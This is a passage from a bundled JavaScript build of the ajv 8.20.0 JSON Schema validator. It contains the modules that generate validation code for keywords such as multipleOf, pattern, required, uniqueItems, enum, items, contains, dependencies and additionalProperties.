});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/multipleOf.js
var require_multipleOf = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/multipleOf.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var error = {
      message: ({ schemaCode }) => (0, codegen_1.str)`must be multiple of ${schemaCode}`,
      params: ({ schemaCode }) => (0, codegen_1._)`{multipleOf: ${schemaCode}}`
    };
    var def = {
      keyword: "multipleOf",
      type: "number",
      schemaType: "number",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, schemaCode, it } = cxt;
        const prec = it.opts.multipleOfPrecision;
        const res = gen.let("res");
        const invalid = prec ? (0, codegen_1._)`Math.abs(Math.round(${res}) - ${res}) > 1e-${prec}` : (0, codegen_1._)`${res} !== parseInt(${res})`;
        cxt.fail$data((0, codegen_1._)`(${schemaCode} === 0 || (${res} = ${data}/${schemaCode}, ${invalid}))`);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/ucs2length.js
var require_ucs2length = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/ucs2length.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    function ucs2length(str) {
      const len = str.length;
      let length = 0;
      let pos = 0;
      let value;
      while (pos < len) {
        length++;
        value = str.charCodeAt(pos++);
        if (value >= 55296 && value <= 56319 && pos < len) {
          value = str.charCodeAt(pos);
          if ((value & 64512) === 56320)
            pos++;
        }
      }
      return length;
    }
    exports2.default = ucs2length;
    ucs2length.code = 'require("ajv/dist/runtime/ucs2length").default';
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitLength.js
var require_limitLength = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitLength.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var ucs2length_1 = require_ucs2length();
    var error = {
      message({ keyword, schemaCode }) {
        const comp = keyword === "maxLength" ? "more" : "fewer";
        return (0, codegen_1.str)`must NOT have ${comp} than ${schemaCode} characters`;
      },
      params: ({ schemaCode }) => (0, codegen_1._)`{limit: ${schemaCode}}`
    };
    var def = {
      keyword: ["maxLength", "minLength"],
      type: "string",
      schemaType: "number",
      $data: true,
      error,
      code(cxt) {
        const { keyword, data, schemaCode, it } = cxt;
        const op = keyword === "maxLength" ? codegen_1.operators.GT : codegen_1.operators.LT;
        const len = it.opts.unicode === false ? (0, codegen_1._)`${data}.length` : (0, codegen_1._)`${(0, util_1.useFunc)(cxt.gen, ucs2length_1.default)}(${data})`;
        cxt.fail$data((0, codegen_1._)`${len} ${op} ${schemaCode}`);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/pattern.js
var require_pattern = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/pattern.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var code_1 = require_code2();
    var util_1 = require_util();
    var codegen_1 = require_codegen();
    var error = {
      message: ({ schemaCode }) => (0, codegen_1.str)`must match pattern "${schemaCode}"`,
      params: ({ schemaCode }) => (0, codegen_1._)`{pattern: ${schemaCode}}`
    };
    var def = {
      keyword: "pattern",
      type: "string",
      schemaType: "string",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, $data, schema, schemaCode, it } = cxt;
        const u = it.opts.unicodeRegExp ? "u" : "";
        if ($data) {
          const { regExp } = it.opts.code;
          const regExpCode = regExp.code === "new RegExp" ? (0, codegen_1._)`new RegExp` : (0, util_1.useFunc)(gen, regExp);
          const valid5 = gen.let("valid");
          gen.try(() => gen.assign(valid5, (0, codegen_1._)`${regExpCode}(${schemaCode}, ${u}).test(${data})`), () => gen.assign(valid5, false));
          cxt.fail$data((0, codegen_1._)`!${valid5}`);
        } else {
          const regExp = (0, code_1.usePattern)(cxt, schema);
          cxt.fail$data((0, codegen_1._)`!${regExp}.test(${data})`);
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitProperties.js
var require_limitProperties = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitProperties.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var error = {
      message({ keyword, schemaCode }) {
        const comp = keyword === "maxProperties" ? "more" : "fewer";
        return (0, codegen_1.str)`must NOT have ${comp} than ${schemaCode} properties`;
      },
      params: ({ schemaCode }) => (0, codegen_1._)`{limit: ${schemaCode}}`
    };
    var def = {
      keyword: ["maxProperties", "minProperties"],
      type: "object",
      schemaType: "number",
      $data: true,
      error,
      code(cxt) {
        const { keyword, data, schemaCode } = cxt;
        const op = keyword === "maxProperties" ? codegen_1.operators.GT : codegen_1.operators.LT;
        cxt.fail$data((0, codegen_1._)`Object.keys(${data}).length ${op} ${schemaCode}`);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/required.js
var require_required = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/required.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var code_1 = require_code2();
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: ({ params: { missingProperty } }) => (0, codegen_1.str)`must have required property '${missingProperty}'`,
      params: ({ params: { missingProperty } }) => (0, codegen_1._)`{missingProperty: ${missingProperty}}`
    };
    var def = {
      keyword: "required",
      type: "object",
      schemaType: "array",
      $data: true,
      error,
      code(cxt) {
        const { gen, schema, schemaCode, data, $data, it } = cxt;
        const { opts } = it;
        if (!$data && schema.length === 0)
          return;
        const useLoop = schema.length >= opts.loopRequired;
        if (it.allErrors)
          allErrorsMode();
        else
          exitOnErrorMode();
        if (opts.strictRequired) {
          const props = cxt.parentSchema.properties;
          const { definedProperties } = cxt.it;
          for (const requiredKey of schema) {
            if ((props === null || props === void 0 ? void 0 : props[requiredKey]) === void 0 && !definedProperties.has(requiredKey)) {
              const schemaPath = it.schemaEnv.baseId + it.errSchemaPath;
              const msg = `required property "${requiredKey}" is not defined at "${schemaPath}" (strictRequired)`;
              (0, util_1.checkStrictMode)(it, msg, it.opts.strictRequired);
            }
          }
        }
        function allErrorsMode() {
          if (useLoop || $data) {
            cxt.block$data(codegen_1.nil, loopAllRequired);
          } else {
            for (const prop of schema) {
              (0, code_1.checkReportMissingProp)(cxt, prop);
            }
          }
        }
        function exitOnErrorMode() {
          const missing = gen.let("missing");
          if (useLoop || $data) {
            const valid5 = gen.let("valid", true);
            cxt.block$data(valid5, () => loopUntilMissing(missing, valid5));
            cxt.ok(valid5);
          } else {
            gen.if((0, code_1.checkMissingProp)(cxt, schema, missing));
            (0, code_1.reportMissingProp)(cxt, missing);
            gen.else();
          }
        }
        function loopAllRequired() {
          gen.forOf("prop", schemaCode, (prop) => {
            cxt.setParams({ missingProperty: prop });
            gen.if((0, code_1.noPropertyInData)(gen, data, prop, opts.ownProperties), () => cxt.error());
          });
        }
        function loopUntilMissing(missing, valid5) {
          cxt.setParams({ missingProperty: missing });
          gen.forOf(missing, schemaCode, () => {
            gen.assign(valid5, (0, code_1.propertyInData)(gen, data, missing, opts.ownProperties));
            gen.if((0, codegen_1.not)(valid5), () => {
              cxt.error();
              gen.break();
            });
          }, codegen_1.nil);
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitItems.js
var require_limitItems = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/limitItems.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var error = {
      message({ keyword, schemaCode }) {
        const comp = keyword === "maxItems" ? "more" : "fewer";
        return (0, codegen_1.str)`must NOT have ${comp} than ${schemaCode} items`;
      },
      params: ({ schemaCode }) => (0, codegen_1._)`{limit: ${schemaCode}}`
    };
    var def = {
      keyword: ["maxItems", "minItems"],
      type: "array",
      schemaType: "number",
      $data: true,
      error,
      code(cxt) {
        const { keyword, data, schemaCode } = cxt;
        const op = keyword === "maxItems" ? codegen_1.operators.GT : codegen_1.operators.LT;
        cxt.fail$data((0, codegen_1._)`${data}.length ${op} ${schemaCode}`);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/equal.js
var require_equal = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/runtime/equal.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var equal = require_fast_deep_equal();
    equal.code = 'require("ajv/dist/runtime/equal").default';
    exports2.default = equal;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/uniqueItems.js
var require_uniqueItems = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/uniqueItems.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var dataType_1 = require_dataType();
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var equal_1 = require_equal();
    var error = {
      message: ({ params: { i, j } }) => (0, codegen_1.str)`must NOT have duplicate items (items ## ${j} and ${i} are identical)`,
      params: ({ params: { i, j } }) => (0, codegen_1._)`{i: ${i}, j: ${j}}`
    };
    var def = {
      keyword: "uniqueItems",
      type: "array",
      schemaType: "boolean",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, $data, schema, parentSchema, schemaCode, it } = cxt;
        if (!$data && !schema)
          return;
        const valid5 = gen.let("valid");
        const itemTypes = parentSchema.items ? (0, dataType_1.getSchemaTypes)(parentSchema.items) : [];
        cxt.block$data(valid5, validateUniqueItems, (0, codegen_1._)`${schemaCode} === false`);
        cxt.ok(valid5);
        function validateUniqueItems() {
          const i = gen.let("i", (0, codegen_1._)`${data}.length`);
          const j = gen.let("j");
          cxt.setParams({ i, j });
          gen.assign(valid5, true);
          gen.if((0, codegen_1._)`${i} > 1`, () => (canOptimize() ? loopN : loopN2)(i, j));
        }
        function canOptimize() {
          return itemTypes.length > 0 && !itemTypes.some((t) => t === "object" || t === "array");
        }
        function loopN(i, j) {
          const item = gen.name("item");
          const wrongType = (0, dataType_1.checkDataTypes)(itemTypes, item, it.opts.strictNumbers, dataType_1.DataType.Wrong);
          const indices = gen.const("indices", (0, codegen_1._)`{}`);
          gen.for((0, codegen_1._)`;${i}--;`, () => {
            gen.let(item, (0, codegen_1._)`${data}[${i}]`);
            gen.if(wrongType, (0, codegen_1._)`continue`);
            if (itemTypes.length > 1)
              gen.if((0, codegen_1._)`typeof ${item} == "string"`, (0, codegen_1._)`${item} += "_"`);
            gen.if((0, codegen_1._)`typeof ${indices}[${item}] == "number"`, () => {
              gen.assign(j, (0, codegen_1._)`${indices}[${item}]`);
              cxt.error();
              gen.assign(valid5, false).break();
            }).code((0, codegen_1._)`${indices}[${item}] = ${i}`);
          });
        }
        function loopN2(i, j) {
          const eql = (0, util_1.useFunc)(gen, equal_1.default);
          const outer = gen.name("outer");
          gen.label(outer).for((0, codegen_1._)`;${i}--;`, () => gen.for((0, codegen_1._)`${j} = ${i}; ${j}--;`, () => gen.if((0, codegen_1._)`${eql}(${data}[${i}], ${data}[${j}])`, () => {
            cxt.error();
            gen.assign(valid5, false).break(outer);
          })));
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/const.js
var require_const = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/const.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var equal_1 = require_equal();
    var error = {
      message: "must be equal to constant",
      params: ({ schemaCode }) => (0, codegen_1._)`{allowedValue: ${schemaCode}}`
    };
    var def = {
      keyword: "const",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, $data, schemaCode, schema } = cxt;
        if ($data || schema && typeof schema == "object") {
          cxt.fail$data((0, codegen_1._)`!${(0, util_1.useFunc)(gen, equal_1.default)}(${data}, ${schemaCode})`);
        } else {
          cxt.fail((0, codegen_1._)`${schema} !== ${data}`);
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/enum.js
var require_enum = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/enum.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var equal_1 = require_equal();
    var error = {
      message: "must be equal to one of the allowed values",
      params: ({ schemaCode }) => (0, codegen_1._)`{allowedValues: ${schemaCode}}`
    };
    var def = {
      keyword: "enum",
      schemaType: "array",
      $data: true,
      error,
      code(cxt) {
        const { gen, data, $data, schema, schemaCode, it } = cxt;
        if (!$data && schema.length === 0)
          throw new Error("enum must have non-empty array");
        const useLoop = schema.length >= it.opts.loopEnum;
        let eql;
        const getEql = () => eql !== null && eql !== void 0 ? eql : eql = (0, util_1.useFunc)(gen, equal_1.default);
        let valid5;
        if (useLoop || $data) {
          valid5 = gen.let("valid");
          cxt.block$data(valid5, loopEnum);
        } else {
          if (!Array.isArray(schema))
            throw new Error("ajv implementation error");
          const vSchema = gen.const("vSchema", schemaCode);
          valid5 = (0, codegen_1.or)(...schema.map((_x, i) => equalCode(vSchema, i)));
        }
        cxt.pass(valid5);
        function loopEnum() {
          gen.assign(valid5, false);
          gen.forOf("v", schemaCode, (v) => gen.if((0, codegen_1._)`${getEql()}(${data}, ${v})`, () => gen.assign(valid5, true).break()));
        }
        function equalCode(vSchema, i) {
          const sch = schema[i];
          return typeof sch === "object" && sch !== null ? (0, codegen_1._)`${getEql()}(${data}, ${vSchema}[${i}])` : (0, codegen_1._)`${data} === ${sch}`;
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/index.js
var require_validation = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/validation/index.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var limitNumber_1 = require_limitNumber();
    var multipleOf_1 = require_multipleOf();
    var limitLength_1 = require_limitLength();
    var pattern_1 = require_pattern();
    var limitProperties_1 = require_limitProperties();
    var required_1 = require_required();
    var limitItems_1 = require_limitItems();
    var uniqueItems_1 = require_uniqueItems();
    var const_1 = require_const();
    var enum_1 = require_enum();
    var validation = [
      // number
      limitNumber_1.default,
      multipleOf_1.default,
      // string
      limitLength_1.default,
      pattern_1.default,
      // object
      limitProperties_1.default,
      required_1.default,
      // array
      limitItems_1.default,
      uniqueItems_1.default,
      // any
      { keyword: "type", schemaType: ["string", "array"] },
      { keyword: "nullable", schemaType: "boolean" },
      const_1.default,
      enum_1.default
    ];
    exports2.default = validation;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/additionalItems.js
var require_additionalItems = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/additionalItems.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.validateAdditionalItems = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: ({ params: { len } }) => (0, codegen_1.str)`must NOT have more than ${len} items`,
      params: ({ params: { len } }) => (0, codegen_1._)`{limit: ${len}}`
    };
    var def = {
      keyword: "additionalItems",
      type: "array",
      schemaType: ["boolean", "object"],
      before: "uniqueItems",
      error,
      code(cxt) {
        const { parentSchema, it } = cxt;
        const { items } = parentSchema;
        if (!Array.isArray(items)) {
          (0, util_1.checkStrictMode)(it, '"additionalItems" is ignored when "items" is not an array of schemas');
          return;
        }
        validateAdditionalItems(cxt, items);
      }
    };
    function validateAdditionalItems(cxt, items) {
      const { gen, schema, data, keyword, it } = cxt;
      it.items = true;
      const len = gen.const("len", (0, codegen_1._)`${data}.length`);
      if (schema === false) {
        cxt.setParams({ len: items.length });
        cxt.pass((0, codegen_1._)`${len} <= ${items.length}`);
      } else if (typeof schema == "object" && !(0, util_1.alwaysValidSchema)(it, schema)) {
        const valid5 = gen.var("valid", (0, codegen_1._)`${len} <= ${items.length}`);
        gen.if((0, codegen_1.not)(valid5), () => validateItems(valid5));
        cxt.ok(valid5);
      }
      function validateItems(valid5) {
        gen.forRange("i", items.length, len, (i) => {
          cxt.subschema({ keyword, dataProp: i, dataPropType: util_1.Type.Num }, valid5);
          if (!it.allErrors)
            gen.if((0, codegen_1.not)(valid5), () => gen.break());
        });
      }
    }
    exports2.validateAdditionalItems = validateAdditionalItems;
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/items.js
var require_items = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/items.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.validateTuple = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var code_1 = require_code2();
    var def = {
      keyword: "items",
      type: "array",
      schemaType: ["object", "array", "boolean"],
      before: "uniqueItems",
      code(cxt) {
        const { schema, it } = cxt;
        if (Array.isArray(schema))
          return validateTuple(cxt, "additionalItems", schema);
        it.items = true;
        if ((0, util_1.alwaysValidSchema)(it, schema))
          return;
        cxt.ok((0, code_1.validateArray)(cxt));
      }
    };
    function validateTuple(cxt, extraItems, schArr = cxt.schema) {
      const { gen, parentSchema, data, keyword, it } = cxt;
      checkStrictTuple(parentSchema);
      if (it.opts.unevaluated && schArr.length && it.items !== true) {
        it.items = util_1.mergeEvaluated.items(gen, schArr.length, it.items);
      }
      const valid5 = gen.name("valid");
      const len = gen.const("len", (0, codegen_1._)`${data}.length`);
      schArr.forEach((sch, i) => {
        if ((0, util_1.alwaysValidSchema)(it, sch))
          return;
        gen.if((0, codegen_1._)`${len} > ${i}`, () => cxt.subschema({
          keyword,
          schemaProp: i,
          dataProp: i
        }, valid5));
        cxt.ok(valid5);
      });
      function checkStrictTuple(sch) {
        const { opts, errSchemaPath } = it;
        const l = schArr.length;
        const fullTuple = l === sch.minItems && (l === sch.maxItems || sch[extraItems] === false);
        if (opts.strictTuples && !fullTuple) {
          const msg = `"${keyword}" is ${l}-tuple, but minItems or maxItems/${extraItems} are not specified or different at path "${errSchemaPath}"`;
          (0, util_1.checkStrictMode)(it, msg, opts.strictTuples);
        }
      }
    }
    exports2.validateTuple = validateTuple;
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/prefixItems.js
var require_prefixItems = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/prefixItems.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var items_1 = require_items();
    var def = {
      keyword: "prefixItems",
      type: "array",
      schemaType: ["array"],
      before: "uniqueItems",
      code: (cxt) => (0, items_1.validateTuple)(cxt, "items")
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/items2020.js
var require_items2020 = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/items2020.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var code_1 = require_code2();
    var additionalItems_1 = require_additionalItems();
    var error = {
      message: ({ params: { len } }) => (0, codegen_1.str)`must NOT have more than ${len} items`,
      params: ({ params: { len } }) => (0, codegen_1._)`{limit: ${len}}`
    };
    var def = {
      keyword: "items",
      type: "array",
      schemaType: ["object", "boolean"],
      before: "uniqueItems",
      error,
      code(cxt) {
        const { schema, parentSchema, it } = cxt;
        const { prefixItems } = parentSchema;
        it.items = true;
        if ((0, util_1.alwaysValidSchema)(it, schema))
          return;
        if (prefixItems)
          (0, additionalItems_1.validateAdditionalItems)(cxt, prefixItems);
        else
          cxt.ok((0, code_1.validateArray)(cxt));
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/contains.js
var require_contains = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/contains.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: ({ params: { min, max } }) => max === void 0 ? (0, codegen_1.str)`must contain at least ${min} valid item(s)` : (0, codegen_1.str)`must contain at least ${min} and no more than ${max} valid item(s)`,
      params: ({ params: { min, max } }) => max === void 0 ? (0, codegen_1._)`{minContains: ${min}}` : (0, codegen_1._)`{minContains: ${min}, maxContains: ${max}}`
    };
    var def = {
      keyword: "contains",
      type: "array",
      schemaType: ["object", "boolean"],
      before: "uniqueItems",
      trackErrors: true,
      error,
      code(cxt) {
        const { gen, schema, parentSchema, data, it } = cxt;
        let min;
        let max;
        const { minContains, maxContains } = parentSchema;
        if (it.opts.next) {
          min = minContains === void 0 ? 1 : minContains;
          max = maxContains;
        } else {
          min = 1;
        }
        const len = gen.const("len", (0, codegen_1._)`${data}.length`);
        cxt.setParams({ min, max });
        if (max === void 0 && min === 0) {
          (0, util_1.checkStrictMode)(it, `"minContains" == 0 without "maxContains": "contains" keyword ignored`);
          return;
        }
        if (max !== void 0 && min > max) {
          (0, util_1.checkStrictMode)(it, `"minContains" > "maxContains" is always invalid`);
          cxt.fail();
          return;
        }
        if ((0, util_1.alwaysValidSchema)(it, schema)) {
          let cond = (0, codegen_1._)`${len} >= ${min}`;
          if (max !== void 0)
            cond = (0, codegen_1._)`${cond} && ${len} <= ${max}`;
          cxt.pass(cond);
          return;
        }
        it.items = true;
        const valid5 = gen.name("valid");
        if (max === void 0 && min === 1) {
          validateItems(valid5, () => gen.if(valid5, () => gen.break()));
        } else if (min === 0) {
          gen.let(valid5, true);
          if (max !== void 0)
            gen.if((0, codegen_1._)`${data}.length > 0`, validateItemsWithCount);
        } else {
          gen.let(valid5, false);
          validateItemsWithCount();
        }
        cxt.result(valid5, () => cxt.reset());
        function validateItemsWithCount() {
          const schValid = gen.name("_valid");
          const count = gen.let("count", 0);
          validateItems(schValid, () => gen.if(schValid, () => checkLimits(count)));
        }
        function validateItems(_valid, block) {
          gen.forRange("i", 0, len, (i) => {
            cxt.subschema({
              keyword: "contains",
              dataProp: i,
              dataPropType: util_1.Type.Num,
              compositeRule: true
            }, _valid);
            block();
          });
        }
        function checkLimits(count) {
          gen.code((0, codegen_1._)`${count}++`);
          if (max === void 0) {
            gen.if((0, codegen_1._)`${count} >= ${min}`, () => gen.assign(valid5, true).break());
          } else {
            gen.if((0, codegen_1._)`${count} > ${max}`, () => gen.assign(valid5, false).break());
            if (min === 1)
              gen.assign(valid5, true);
            else
              gen.if((0, codegen_1._)`${count} >= ${min}`, () => gen.assign(valid5, true));
          }
        }
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/dependencies.js
var require_dependencies = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/dependencies.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    exports2.validateSchemaDeps = exports2.validatePropertyDeps = exports2.error = void 0;
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var code_1 = require_code2();
    exports2.error = {
      message: ({ params: { property, depsCount, deps } }) => {
        const property_ies = depsCount === 1 ? "property" : "properties";
        return (0, codegen_1.str)`must have ${property_ies} ${deps} when property ${property} is present`;
      },
      params: ({ params: { property, depsCount, deps, missingProperty } }) => (0, codegen_1._)`{property: ${property},
    missingProperty: ${missingProperty},
    depsCount: ${depsCount},
    deps: ${deps}}`
      // TODO change to reference
    };
    var def = {
      keyword: "dependencies",
      type: "object",
      schemaType: "object",
      error: exports2.error,
      code(cxt) {
        const [propDeps, schDeps] = splitDependencies(cxt);
        validatePropertyDeps(cxt, propDeps);
        validateSchemaDeps(cxt, schDeps);
      }
    };
    function splitDependencies({ schema }) {
      const propertyDeps = {};
      const schemaDeps = {};
      for (const key in schema) {
        if (key === "__proto__")
          continue;
        const deps = Array.isArray(schema[key]) ? propertyDeps : schemaDeps;
        deps[key] = schema[key];
      }
      return [propertyDeps, schemaDeps];
    }
    function validatePropertyDeps(cxt, propertyDeps = cxt.schema) {
      const { gen, data, it } = cxt;
      if (Object.keys(propertyDeps).length === 0)
        return;
      const missing = gen.let("missing");
      for (const prop in propertyDeps) {
        const deps = propertyDeps[prop];
        if (deps.length === 0)
          continue;
        const hasProperty = (0, code_1.propertyInData)(gen, data, prop, it.opts.ownProperties);
        cxt.setParams({
          property: prop,
          depsCount: deps.length,
          deps: deps.join(", ")
        });
        if (it.allErrors) {
          gen.if(hasProperty, () => {
            for (const depProp of deps) {
              (0, code_1.checkReportMissingProp)(cxt, depProp);
            }
          });
        } else {
          gen.if((0, codegen_1._)`${hasProperty} && (${(0, code_1.checkMissingProp)(cxt, deps, missing)})`);
          (0, code_1.reportMissingProp)(cxt, missing);
          gen.else();
        }
      }
    }
    exports2.validatePropertyDeps = validatePropertyDeps;
    function validateSchemaDeps(cxt, schemaDeps = cxt.schema) {
      const { gen, data, keyword, it } = cxt;
      const valid5 = gen.name("valid");
      for (const prop in schemaDeps) {
        if ((0, util_1.alwaysValidSchema)(it, schemaDeps[prop]))
          continue;
        gen.if(
          (0, code_1.propertyInData)(gen, data, prop, it.opts.ownProperties),
          () => {
            const schCxt = cxt.subschema({ keyword, schemaProp: prop }, valid5);
            cxt.mergeValidEvaluated(schCxt, valid5);
          },
          () => gen.var(valid5, true)
          // TODO var
        );
        cxt.ok(valid5);
      }
    }
    exports2.validateSchemaDeps = validateSchemaDeps;
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/propertyNames.js
var require_propertyNames = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/propertyNames.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var codegen_1 = require_codegen();
    var util_1 = require_util();
    var error = {
      message: "property name must be valid",
      params: ({ params }) => (0, codegen_1._)`{propertyName: ${params.propertyName}}`
    };
    var def = {
      keyword: "propertyNames",
      type: "object",
      schemaType: ["object", "boolean"],
      error,
      code(cxt) {
        const { gen, schema, data, it } = cxt;
        if ((0, util_1.alwaysValidSchema)(it, schema))
          return;
        const valid5 = gen.name("valid");
        gen.forIn("key", data, (key) => {
          cxt.setParams({ propertyName: key });
          cxt.subschema({
            keyword: "propertyNames",
            data: key,
            dataTypes: ["string"],
            propertyName: key,
            compositeRule: true
          }, valid5);
          gen.if((0, codegen_1.not)(valid5), () => {
            cxt.error(true);
            if (!it.allErrors)
              gen.break();
          });
        });
        cxt.ok(valid5);
      }
    };
    exports2.default = def;
  }
});

// node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/additionalProperties.js
var require_additionalProperties = __commonJS({
  "node_modules/.pnpm/ajv@8.20.0/node_modules/ajv/dist/vocabularies/applicator/additionalProperties.js"(exports2) {
    "use strict";
    Object.defineProperty(exports2, "__esModule", { value: true });
    var code_1 = require_code2();
    var codegen_1 = require_codegen();
    var names_1 = require_names();
    var util_1 = require_util();
    var error = {
      message: "must NOT have additional properties",
      params: ({ params }) => (0, codegen_1._)`{additionalProperty: ${params.additionalProperty}}`
    };
    var def = {
      keyword: "additionalProperties",
      type: ["object"],
      schemaType: ["boolean", "object"],
      allowUndefined: true,
      trackErrors: true,
      error,
      code(cxt) {
        const { gen, schema, parentSchema, data, errsCount, it } = cxt;
        if (!errsCount)
          throw new Error("ajv implementation error");
        const { allErrors, opts } = it;
        it.props = true;
        if (opts.removeAdditional !== "all" && (0, util_1.alwaysValidSchema)(it, schema))
          return;
        const props = (0, code_1.allSchemaProperties)(parentSchema.properties);
        const patProps = (0, code_1.allSchemaProperties)(parentSchema.patternProperties);
        checkAdditionalProperties();
        cxt.ok((0, codegen_1._)`${errsCount} === ${names_1.default.errors}`);
        function checkAdditionalProperties() {
          gen.forIn("key", data, (key) => {
            if (!props.length && !patProps.length)
              additionalPropertyCode(key);
            else
              gen.if(isAdditional(key), () => additionalPropertyCode(key));
          });
        }
        function isAdditional(key) {
          let definedProp;
          if (props.length > 8) {
            const propsSchema = (0, util_1.schemaRefOrVal)(it, parentSchema.properties, "properties");
            definedProp = (0, code_1.isOwnProperty)(gen, propsSchema, key);
          } else if (props.length) {
            definedProp = (0, codegen_1.or)(...props.map((p) => (0, codegen_1._)`${key} === ${p}`));
          } else {
            definedProp = codegen_1.nil;
          }
          if (patProps.length) {
